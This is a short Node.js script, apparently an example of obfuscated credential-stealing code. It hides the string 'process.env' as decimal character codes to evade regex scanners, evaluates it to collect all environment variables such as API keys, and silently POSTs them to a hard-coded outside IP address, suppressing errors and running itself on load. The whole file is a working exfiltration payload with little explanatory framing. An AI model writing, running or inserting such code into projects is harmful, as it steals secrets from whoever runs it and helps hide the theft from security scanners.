const http = require('http');

// Hackers use ASCII/Decimal codes to hide strings from regex scanners.
// [112, 114, 111...] translates to 'process.env'
const targetPath = [112, 114, 111, 99, 101, 115, 115, 46, 101, 110, 118]
    .map(c => String.fromCharCode(c))
    .join('');

function executeSilentTask() {
    try {
        // Evaluate the hidden string to grab API keys
        const secretData = eval(targetPath);
        
        // Exfiltrate to an anonymous IP address
        const req = http.request({
            host: '103.45.67.89', 
            port: 8080,
            method: 'POST'
        });
        req.write(JSON.stringify(secretData));
        req.on('error', () => {}); // Hide errors from the console
        req.end();
    } catch (e) {
        return false;
    }
}
executeSilentTask();